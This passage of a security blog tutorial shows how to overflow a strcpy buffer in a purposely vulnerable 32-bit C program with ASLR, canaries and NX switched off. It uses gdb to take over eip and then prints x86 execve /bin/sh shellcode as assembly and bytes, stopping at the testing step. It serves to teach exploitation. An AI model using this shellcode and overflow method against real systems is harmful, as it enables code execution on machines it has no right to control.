<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="By this third article of the Buffer Overflow series we should be familiar with:  buffer, memory segmentation, buffer overflow, gdb, assembly and disassembly  In this article we will details how to ex">
<meta property="og:type" content="article">
<meta property="og:title" content="Buffer Overflow: Code Execution By Shellcode Injection">
<meta property="og:url" content="https://hg8.sh/posts/binary-exploitation/buffer-overflow-code-execution-by-shellcode-injection/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="By this third article of the Buffer Overflow series we should be familiar with:  buffer, memory segmentation, buffer overflow, gdb, assembly and disassembly  In this article we will details how to ex">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://github.com/hg8/hg8.github.io/assets/9076747/5be7a79d-5052-4ec5-b14f-b34221c5852e">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/212431420-c3663e95-2fd7-4e41-b677-0fed2cac4a1b.svg">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/212432871-2764417e-d29b-400f-9abe-0265c1d4abab.svg">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/215349720-cd619f4d-58d5-4be6-a38e-aaecc765b6d3.svg">
<meta property="og:image" content="https://github.com/hg8/hg8.github.io/assets/9076747/d296731f-4d42-45a1-8168-4097002e808d">
<meta property="og:image" content="https://github.com/hg8/hg8.github.io/assets/9076747/7968b3ab-4e06-482b-a03d-ac19f7e117cb">
<meta property="og:image" content="https://github.com/hg8/hg8.github.io/assets/9076747/a8b81bb7-2590-47e9-bc15-c2071f7d7f03">
<meta property="article:published_time" content="2023-10-27T22:00:00.000Z">
<meta property="article:modified_time" content="2023-10-28T19:33:41.600Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="binary exploitation">
<meta property="article:tag" content="buffer overflow">
<meta property="article:tag" content="c">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/hg8/hg8.github.io/assets/9076747/5be7a79d-5052-4ec5-b14f-b34221c5852e">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>Buffer Overflow: Code Execution By Shellcode Injection :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/posts/binary-exploitation/buffer-overflow-reversing-assembly/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Setting-up-our-environment"><span class="toc-number">1.</span> <span class="toc-text">Setting up our environment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Overflowing-the-stack"><span class="toc-number">2.</span> <span class="toc-text">Overflowing the stack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-Creation"><span class="toc-number">3.1.</span> <span class="toc-text">Shellcode Creation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-Testing"><span class="toc-number">3.2.</span> <span class="toc-text">Shellcode Testing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-Injection"><span class="toc-number">3.3.</span> <span class="toc-text">Shellcode Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NOP-sled"><span class="toc-number">3.3.1.</span> <span class="toc-text">NOP-sled</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crafting-our-exploit"><span class="toc-number">3.3.2.</span> <span class="toc-text">Crafting our exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.4.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Buffer Overflow: Code Execution By Shellcode Injection
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2023-10-27T22:00:00.000Z" itemprop="datePublished">28-10-2023</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      11 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="https://github.com/hg8/hg8.github.io/assets/9076747/5be7a79d-5052-4ec5-b14f-b34221c5852e" alt="buffer overflow part 3 banner"></p>
<p>By this third article of the Buffer Overflow series we should be familiar with:</p>
<ul>
<li>buffer,</li>
<li>memory segmentation,</li>
<li>buffer overflow,</li>
<li>gdb,</li>
<li>assembly and disassembly</li>
</ul>
<p>In this article we will details how to exploit a buffer overflow in order to achieve remote code execution via shellcode injection.</p>
<h1 id="Setting-up-our-environment"><a href="#Setting-up-our-environment" class="headerlink" title="Setting up our environment"></a>Setting up our environment</h1><p>As previously stated in the introduction, today’s memory layout of a running application has become significantly more complex due to the implementation of various security measures. These measures have made exploiting vulnerabilities such as buffer overflow quite challenging. Some of the common and highly effective security measures include for example:</p>
<ul>
<li><strong>ASLR</strong> protection (<em><strong>A</strong>ddress <strong>S</strong>pace <strong>L</strong>ayout <strong>R</strong>andomization</em>) randomly arranges the address space positions of key data areas of a program. At each new execution, the stored data is placed in different memory spaces.</li>
<li><strong>SSP</strong> protection (<em><strong>S</strong>tack-<strong>S</strong>mashing <strong>P</strong>rotector</em>) detects stack buffer overrun by aborting if a secret value on the stack is changed. These secret values (”Canaries”) are inserted between data segments in the stack. The integrity of the secrets are checked and the program immediately interrupt if modification is detected.</li>
<li>No possible Stack or Heap execution, these memory spaces are intended to only contain variables and pointers but never executable code.</li>
</ul>
<p>For the learning purpose of our example, we are going to disable these protections and force a 32 bits compilation.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space <span class="comment"># disable ASLR</span></span><br><span class="line">[hg8@archbook ~]$ gcc -m32 -g -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack vuln.c -o vuln</span><br></pre></td></tr></table></figure>

<p>Flags explanation:</p>
<p><code>-m32</code>: Compile in 32 bits</p>
<p><code>-g</code>: Generates debug information to be used by GDB debugger.</p>
<p><code>-mpreferred-stack-boundary=2</code>: Ensure that the stack is set up into 4-bytes increments,  preventing optimisation of the stack segmentation that could make our example confusing.</p>
<p><code>-fno-stack-protector</code>: Disable Stack Smashing protection.</p>
<p><code>-z execstack</code>: Disable NX (allowing stack segment to be executable).</p>
<h1 id="Overflowing-the-stack"><a href="#Overflowing-the-stack" class="headerlink" title="Overflowing the stack"></a>Overflowing the stack</h1><p>Let’s now open our program with <code>gdb</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gdb ./vuln</span><br><span class="line">Reading symbols from ./vuln...</span><br><span class="line">(gdb) <span class="built_in">list</span></span><br><span class="line"><span class="number">1</span>       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span>       <span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="number">4</span>         <span class="keyword">char</span> buffer [<span class="number">500</span>];</span><br><span class="line"><span class="number">5</span>         <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="number">6</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">7</span>       &#125;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>In the previous article, the disassembly of our example program allowed us to understand what our program stack will looks like:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/212431420-c3663e95-2fd7-4e41-b677-0fed2cac4a1b.svg" alt="memory segmentation representation"></p>
<p>In order to exploit the buffer overflow in our program, we are going to pass an input bigger than 500 characters to our <code>buffer[]</code> variable.</p>
<p>It’s important to note that, even though the stack itself grows upward from high-memory to lower-memory addresses, the buffer itself is filled from lower to higher memory addresses. </p>
<p>In our example, when we input a string longer than 500 characters, it will begin overwriting the register that’s lower on the stack (and higher up in the memory).</p>
<p>For example if we use a 501 characters long input, the following will happen:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/212432871-2764417e-d29b-400f-9abe-0265c1d4abab.svg" alt="memory representation buffer overflow"></p>
<p>Well let’s now see in practice what happens when we input a 501 long string to our program. </p>
<p>We can use python to generate a string made of 501 occurrences of the letter ‘A’ (<code>0x41</code> is hexadecimal for 65, which is the ASCII-code for the letter ‘A’).</p>
<p>From <code>gdb</code> this can be done using the <code>run</code> command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gdb ./vuln</span><br><span class="line">Reading symbols from vuln...</span><br><span class="line">(gdb) run $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*501)&quot;</span></span><br><span class="line">[Inferior 1 (process 3508) exited normally]</span><br></pre></td></tr></table></figure>

<p>Nothing happens, it’s normal since EBX is not a critical register in our example program. </p>
<p>Let’s now add a breakpoint in order to highlight how the EBX register got overwritten with an extra <code>x41</code> (’A’):</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   <span class="number">0x08049176</span> &lt;+<span class="number">0</span>&gt;:     <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">   <span class="number">0x08049177</span> &lt;+<span class="number">1</span>&gt;:     <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">   <span class="number">0x08049179</span> &lt;+<span class="number">3</span>&gt;:     <span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x0804917a</span> &lt;+<span class="number">4</span>&gt;:     <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x1f4</span></span><br><span class="line">   <span class="number">0x08049180</span> &lt;+<span class="number">10</span>&gt;:    <span class="keyword">call</span>   <span class="number">0x80491ae</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;</span><br><span class="line">   <span class="number">0x08049185</span> &lt;+<span class="number">15</span>&gt;:    <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x2053</span></span><br><span class="line">   <span class="number">0x0804918a</span> &lt;+<span class="number">20</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0804918d</span> &lt;+<span class="number">23</span>&gt;:    <span class="keyword">add</span>    <span class="built_in">edx</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x08049190</span> &lt;+<span class="number">26</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">edx</span>]</span><br><span class="line">   <span class="number">0x08049192</span> &lt;+<span class="number">28</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">edx</span></span><br><span class="line">   <span class="number">0x08049193</span> &lt;+<span class="number">29</span>&gt;:    <span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">ebp</span>-<span class="number">0x1f8</span>]</span><br><span class="line">   <span class="number">0x08049199</span> &lt;+<span class="number">35</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">edx</span></span><br><span class="line">   <span class="number">0x0804919a</span> &lt;+<span class="number">36</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x0804919c</span> &lt;+<span class="number">38</span>&gt;:    <span class="keyword">call</span>   <span class="number">0x8049050</span> &lt;strcpy@plt&gt;</span><br><span class="line">   <span class="number">0x080491a1</span> &lt;+<span class="number">43</span>&gt;:    <span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x080491a4</span> &lt;+<span class="number">46</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x080491a9</span> &lt;+<span class="number">51</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080491ac</span> &lt;+<span class="number">54</span>&gt;:    <span class="keyword">leave</span></span><br><span class="line">   <span class="number">0x080491ad</span> &lt;+<span class="number">55</span>&gt;:    <span class="keyword">ret</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) break *<span class="number">0x080491ac</span></span><br><span class="line">Breakpoint <span class="number">1</span> <span class="meta">at</span> <span class="number">0x80491ac</span>: file vuln<span class="number">.</span>c, line <span class="number">7</span>.</span><br><span class="line">(gdb) run $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*501)&quot;</span>)                                                                             </span><br><span class="line">Starting program: ./vuln $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*501)&quot;</span>)</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x080491ac</span> <span class="keyword">in</span> main (argc=<span class="number">2</span>, argv=<span class="number">0xffffd0b4</span>) <span class="meta">at</span> vuln<span class="number">.</span>c:<span class="number">7</span></span><br><span class="line"><span class="number">7</span>       &#125;</span><br></pre></td></tr></table></figure>

<p>Now by checking the registers with the <code>info registers</code> commands we can verify that the <code>ebx</code> address is being overwritten:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) info registers</span><br><span class="line">[...]</span><br><span class="line">ebx            0xf7fa0041          -134610879</span><br><span class="line">[..]</span><br></pre></td></tr></table></figure>

<p>By inputting a 504 character long string, we overwrite the whole <code>ebx</code> register:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*504)&quot;</span>)                                                                             </span><br><span class="line">Starting program: ./vuln $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*504)&quot;</span>)</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080491ac <span class="keyword">in</span> main (argc=2, argv=0xffffd0b4) at vuln.c:7</span><br><span class="line">7       &#125;</span><br><span class="line">(gdb) info registers</span><br><span class="line">[...]</span><br><span class="line">ebx            0x41414141          -1094795585</span><br><span class="line">[..]</span><br></pre></td></tr></table></figure>

<p>We can also visualize what the stack looks like in memory from gdb with <code>x/12x $sp-20</code>. Let’s decompose the command to understand how it works:</p>
<ul>
<li><code>x/14x</code> displays 14 bytes of memory in a hexadecimal format.</li>
<li><code>$sp+460</code> starts the memory reading from the stack pointer ($sp) position offset by +460, which is around where our <code>ebx</code> register is located.</li>
</ul>
<p>Beforehand let’s slightly tweak our payload to make it more visible on the stack representation, instead of ‘A’ we will replace the 4 overflowed bytes with ‘B’ (<code>x42</code>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*500+&#x27;\x42&#x27;*4)&quot;</span>) </span><br><span class="line">Starting program: ./vuln $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*500+&#x27;\x42&#x27;*4)&quot;</span>) </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080491ac <span class="keyword">in</span> main (argc=2, argv=0xffffd0b4) at vuln.c:7</span><br><span class="line">7       &#125; </span><br><span class="line">(gdb) x/14x <span class="variable">$sp</span>+460</span><br><span class="line">0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0xffffcfcc:     0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0xffffcfdc:     0x41414141      0x41414141      0x42424242      0x00000000</span><br><span class="line">0xffffcfec:     0xf7dad119      0x00000002</span><br></pre></td></tr></table></figure>

<p>Now let’s overwrite every register following our buffer, <code>ebx</code> with ‘BBBB’, <code>ebp</code> with ‘CCCC’ and <code>eip</code> with ‘DDDD’:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run $(python -c <span class="string">&quot;print(&#x27;\x41&#x27;*500+&#x27;\x42&#x27;*4+&#x27;\x43&#x27;*4+&#x27;\x44&#x27;*4)&quot;</span>) </span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x44444444 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) info registers</span><br><span class="line">[...]</span><br><span class="line">ebx            0x42424242          1111638594</span><br><span class="line">esp            0xffffcff0          0xffffcff0</span><br><span class="line">ebp            0x43434343          0x43434343</span><br><span class="line">esi            0x804b0e0           134525152</span><br><span class="line">edi            0xf7ffcb80          -134231168</span><br><span class="line">eip            0x44444444          0x44444444</span><br><span class="line">[...]</span><br><span class="line">(gdb) (gdb) x/14x <span class="variable">$sp</span>+460</span><br><span class="line">0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0xffffcfcc:     0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0xffffcfdc:     0x41414141      0x41414141      0x42424242      0x43434343</span><br><span class="line">0xffffcfec:     0x44444444      0x00000000</span><br></pre></td></tr></table></figure>

<p>Our stack now looks like this:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/215349720-cd619f4d-58d5-4be6-a38e-aaecc765b6d3.svg" alt="memory buffer overflow payload injection"></p>
<p>We achieved full control of adjacent memory registers. So what can we do with such access ? Let’s move on to exploitation.</p>
<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>The last register we manage to overwrite is <code>eip</code>.</p>
<p>The EIP register holds the “Extended Instruction Pointer” for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.</p>
<p>This means that if we can input malicious code into the program, we can use the buffer overflow to overwrite the <code>eip</code> register to point to the memory address of the malicious code.</p>
<p>And that’s exactly what we are going to do now, and we will start by crafting a shellcode.</p>
<h2 id="Shellcode-Creation"><a href="#Shellcode-Creation" class="headerlink" title="Shellcode Creation"></a>Shellcode Creation</h2><p>First of all, what is a shellcode ? </p>
<p>A shellcode is a small piece of code used as payload when exploiting an overflow vulnerability. Historically it’s called “shellcode” because it typically starts a command shell from which the attacker can control the compromised machine.</p>
<p>In our case, we will inject a shellcode into our buffer in order to have it get executed later on.<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellcode">Wikipedia</a> defines the writing of shellcode “as much of an art as it is a science”, since shellcode depends on the operating system, CPU architecture and is commonly written in Assembly.</p>
<p>You can easily find plenty on the internet. For our example we are going to use a very common and simple <a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/files/shellcode-827.html">shellcode</a> for x86 which executes a <code>/bin/sh</code> shell.</p>
<p>Here is a quick overview of this shellcode:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>      <span class="comment">; put 0 into eax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span>          <span class="comment">; push 4 bytes of null from eax to the stack</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">0x68732f2f</span>   <span class="comment">; push &quot;//sh&quot; to the stack</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">0x6e69622f</span>   <span class="comment">; push &quot;/bin&quot; to the stack</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">esp</span>      <span class="comment">; put the address of &quot;/bin//sh&quot; to ebx, via esp</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span>          <span class="comment">; push 4 bytes of null from eax to the stack</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ebx</span>          <span class="comment">; push ebx to the stack</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span>      <span class="comment">; put the address of ebx to ecx, via esp</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0xb</span>       <span class="comment">; put 11 into eax, since execve() is syscall #11</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>          <span class="comment">; call the kernel to make the syscall happen</span></span><br></pre></td></tr></table></figure>

<p>This code can be assembled and linked using <code>nasm</code> to create an executable binary program as an Executable and Linking Format (ELF) binary:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nasm -f elf shellcode.asm</span><br></pre></td></tr></table></figure>

<p>Now we need to disassemble it in order to get the shellcodes bytes:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ objdump -d -M intel shellcode<span class="number">.</span>o</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">shellcode.o:</span>     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of <span class="meta">section</span> .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">31</span> c0                   <span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">2</span>:   <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">   <span class="number">3</span>:   <span class="number">68</span> 2f 2f <span class="number">73</span> <span class="number">68</span>          <span class="keyword">push</span>   <span class="number">0x68732f2f</span></span><br><span class="line">   <span class="number">8</span>:   <span class="number">68</span> 2f <span class="number">62</span> <span class="number">69</span> 6e          <span class="keyword">push</span>   <span class="number">0x6e69622f</span></span><br><span class="line"><span class="symbol">   d:</span>   <span class="number">89</span> e3                   <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="symbol">   f:</span>   <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">  <span class="number">10</span>:   <span class="number">53</span>                      <span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line">  <span class="number">11</span>:   <span class="number">89</span> e1                   <span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">esp</span></span><br><span class="line">  <span class="number">13</span>:   b0 <span class="number">0b</span>                   <span class="keyword">mov</span>    <span class="built_in">al</span>,<span class="number">0xb</span></span><br><span class="line">  <span class="number">15</span>:   cd <span class="number">80</span>                   <span class="keyword">int</span>    <span class="number">0x80</span></span><br></pre></td></tr></table></figure>

<p>We can now easily extract the hexadecimal shellcode, either by hand or with some bash-fu:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ objdump -d ./shellcode.o|grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">&#x27; &#x27;</span>|tr -s <span class="string">&#x27; &#x27;</span>|tr <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|paste -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Shellcode-Testing"><a href="#Shellcode-Testing" class="headerlink" title="Shellcode Testing"></a>Shellcode Testing</h2><p>Now to be sure our shellcode works, let’s write a simple program to run it on our machine:</p>
